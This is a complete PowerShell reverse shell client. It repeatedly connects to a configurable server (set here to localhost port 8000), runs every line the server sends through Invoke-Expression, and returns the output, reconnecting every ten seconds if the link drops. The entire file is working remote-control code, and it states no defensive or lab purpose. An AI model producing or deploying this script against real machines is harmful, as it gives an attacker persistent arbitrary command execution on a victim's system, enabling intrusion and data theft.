$address = 'localhost'
$port = 8000

while ($true) {

    echo 'Trying to reach server...'
    do {
        try {
            $client = New-Object System.Net.Sockets.TcpClient($address, $port)
        }
        catch {
            Start-Sleep -s 10
        }
    } while (-not $client)

    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)

    # Execute commands sent by the server, and return output
    do {
        $cmd = $reader.ReadLine()
        if ($cmd -eq 'bye') {
            break
        }
        try {
            $output = [string](iex $cmd)
        }
        catch {
            $output = $_.Exception.Message
        }
        $writer.WriteLine($output)
        $writer.Flush()
    } while($true)

    # Cleanup
    $reader.Close()
    $writer.Close()
    $client.Close()
}
